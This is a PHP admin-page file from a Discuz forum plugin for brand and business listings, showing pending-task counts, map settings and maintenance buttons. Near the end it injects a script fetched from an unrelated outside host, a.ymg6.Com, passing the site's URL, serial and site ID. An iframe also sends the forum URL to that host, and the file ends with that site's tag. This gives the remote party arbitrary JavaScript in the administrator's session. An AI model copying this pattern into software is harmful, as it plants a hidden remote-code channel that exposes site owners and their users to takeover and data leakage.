<?php

/**
 *      [Sanree] (C)2012-2099 Sanree Inc.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: sanree_brand_base.php $
 */

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}

$do = $_G['sr_do'];
$doarray = array('config', 'cleartable', 'fixbranddiy');
$do = !in_array($do, $doarray) ? 'config' : $do;

if ($do == 'cleartable') {

    C::t('#sanree_brand#sanree_brand_district')->cleartable();
	cpmsg($langs['succeed'], "action=".$thisurl, 'succeed');
	
}
elseif ($do == 'config') {

	showsubmenu($menustr);	
	showtableheader($langs['adminwork'], 'nobottom', 'style="border:1px solid #cccccc"');
	$bccount = C::t('#sanree_brand#sanree_brand_msg')->count_by_where(' AND status<>1 AND typeid=0');
	$rlcount = C::t('#sanree_brand#sanree_brand_msg')->count_by_where(' AND status<>1 AND typeid=1');
	$fkcount = C::t('#sanree_brand#sanree_brand_msg')->count_by_where(' AND status<>1 AND typeid=2');
	$jbcount = C::t('#sanree_brand#sanree_brand_msg')->count_by_where(' AND status<>1 AND typeid=3');
	$okcount = C::t('#sanree_brand#sanree_brand_businesses')->count_by_where(' AND status=1 AND isshow=1');

?>
<TR class=border><TD colspan="5">
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=businesseslist&identifier=sanree_brand&pmod=admincp">
<?php echo $langs['adminwork_str0']?><span  style="color:red"><?php echo $okcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=businesseslist&do=businessesaudit&identifier=sanree_brand&pmod=admincp">
<?php echo $langs['adminwork_str1']?><span  style="color:red"><?php echo $newcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=msg&type=2&do=businessesaudit&identifier=sanree_brand&pmod=admincp">
<?php echo $langs['adminwork_str2']?><span  style="color:red"><?php echo $rlcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=msg&type=1&do=businessesaudit&identifier=sanree_brand&pmod=admincp">
<?php echo $langs['adminwork_str3']?><span  style="color:red"><?php echo $bccount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=msg&type=3&do=businessesaudit&identifier=sanree_brand&pmod=admincp">
<?php echo $langs['adminwork_str4']?><span  style="color:red"><?php echo $fkcount?></span><?php echo $langs['ge']?></a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=msg&type=4&do=businessesaudit&identifier=sanree_brand&pmod=admincp">
<?php echo $langs['adminwork_str5']?><span  style="color:red"><?php echo $jbcount?></span><?php echo $langs['ge']?></a>
</TD></TR>
<?php	
	showtablefooter();
	showtableheader($langs['base'], 'nobottom', 'style="border:1px solid #cccccc"');
	$siteurl = urlencode("http://taobao.ilovezj.com/");
?>
	<script language="javascript">disallowfloat = 'newthread';</script>
		<script language="javascript">
		function copycode(code) {
			  window.clipboardData.setData("Text",code);
			  alert("<?php echo $langs['copysucceed']?>");
		}
		function copymap() {
			var code = $('mappoint_mappoint').value;
			copycode(code);
		}
		function cleardis(){
			if(confirm('<?php echo $langs['cleardistricttip'];?>'))
			{
				location.href= '<?php echo ADMINSCRIPT?>?action=plugins&operation=config&act=base&do=cleartable&identifier=sanree_brand&pmod=admincp';
			}
		}
		var SN='2013061900E0e0f30HO0';
		var RevisionID='5057';
		var RevisionDateline='1442484001';
		var SiteUrl='http://taobao.ilovezj.com/';
		var ClientUrl='http://taobao.ilovezj.com/';
		var SiteID='18E27469-B96D-057B-88AC-66A8900A4B81';		
		var src= 'http://a.ymg6.Com/api.php?type=js&SN='+SN + '&RevisionID='+ RevisionID + '&RevisionDateline='+RevisionDateline+ '&SiteUrl='+SiteUrl+ '&ClientUrl='+ClientUrl+'&SiteID='+SiteID;
		</script>	
<?php if ($mapapi=='baidu'){ ?>	
<script type="text/javascript" src="http://api.map.baidu.com/api?v=1.2"></script>
<script type="text/javascript" src=" http://api.map.baidu.com/library/CityList/1.2/src/CityList_min.js"></script>
<?php }?>
<?php if ($mapapi=='google'){ ?>	
<script src="http://maps.google.com/maps/api/js?sensor=false" type="text/javascript"></script>
<?php }?>
<TR class=noborder><TD class="vtop rowform"><?php echo $langs['mappos']?><INPUT id="mappoint_mappoint" size="30" class=txt1 name=mappoint_mappoint  value="<?php echo $result['mappos'];?>"id="mappoint_mappoint"> 
</TD>
<TD class="vtop tips2" s="111"><a href="plugin.php?id=sanree_brand&mod=map&do=marked" id="showmap" onclick="showWindow('showmap',this.href);return false;"><?php echo $langs['marked']?></a> &nbsp;&nbsp;<a href="###" onclick="copymap()" ><?php echo $langs['copymappos']?></a></TD></TR>
	<?php
		showtablefooter();
	showtableheader($langs['admincon'], 'nobottom', 'style="border:1px solid #cccccc"');		
	?>
  <tr>
    <td>
	<?php echo '<input onclick="location.href=\''.$adminurl.'&act=updatecache\'" type="button" class="btn" id="submit_updatecache" name="updatecachesubmit" value="'.$langs['updatecache'].'" />';?>
	<?php echo '<input onclick="cleardis();" type="button" class="btn" id="submit_blocksubmit" name="blocksubmit" value="'.$langs['cleardistrict'].'" />';?>
	</td>
    <td>&nbsp;</td>
  </tr>
	<?php
	showtablefooter();
	showtableheader($langs['sanreeinfo'], 'nobottom', 'style="border:1px solid #cccccc"');	
	$sitedata = urlencode($_G['siteurl']);	
	?>
	  <tr>
		<td>		
		<iframe src="http://a.ymg6.Com/ad.php?sitedata=<?php echo $sitedata?>" width="100%" height="200" scrolling="yes" frameborder="0"></iframe></td>
	  </tr>
	  <script language="javascript">
		document.write('<' + 'script src="' + src + '"' + ' type="text/javascript"><' + '/script>');		  
	  </script>
	<?php
	showtablefooter();	
}
//From:www_YMG6_COM
?>